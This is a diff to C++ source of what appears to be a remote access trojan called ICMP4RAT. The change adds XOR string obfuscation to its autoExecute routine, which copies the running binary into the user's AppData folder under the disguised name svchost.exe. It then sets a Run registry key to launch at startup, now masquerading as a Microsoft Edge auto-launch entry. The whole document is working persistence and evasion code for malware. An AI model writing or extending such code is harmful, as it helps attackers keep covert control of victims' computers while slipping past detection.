@@ -9,19 +9,23 @@
 void autoExecute() {
     CHAR szDir[260];
     CHAR pName[260];
-    GetEnvironmentVariableA_c("APPDATA", szDir, 260);
+
+    GetEnvironmentVariableA_c(StringXOR("DUUADQD", 5).c_str(), szDir, 260); //APPDATA
+
     std::string str(szDir);
     str += "\\ICMP4RAT";
     GetModuleFileNameA_c(GetModuleHandle(0), pName, 260);
     CreateDirectoryA_c(str.c_str(), NULL);
-    str += "\\svchost.exe";
+
+    str += StringXOR("YYvsfmjvq+`}`", 5).c_str(); //svchost.exe
     CopyFileA_c(pName, str.c_str(), FALSE);
+
     char Driver[MAX_PATH];
     HKEY hKey;
     strcpy_s(Driver, str.c_str());
-    RegOpenKeyExA_c(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
-
-    RegSetValueExA_c(hKey, "testtesttesttesttest", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
+    
+    RegOpenKeyExA_c(HKEY_CURRENT_USER, StringXOR("VJCQRDW@YYHlfwjvjcqYYRlkajrvYYFpww`kqS`wvljkYYWpk", 5).c_str(), 0, KEY_SET_VALUE, &hKey); //SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+    RegSetValueExA_c(hKey, StringXOR("Hlfwjvjcq@ab`DpqjIdpkfmZ07F06CFG41007467FG6FG6ADDGA474G", 5).c_str(), 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH); //MicrosoftEdgeAutoLaunch_52C53FCB14552132CB3CB3DAABD121B
     RegCloseKey_c(hKey);
 }
 
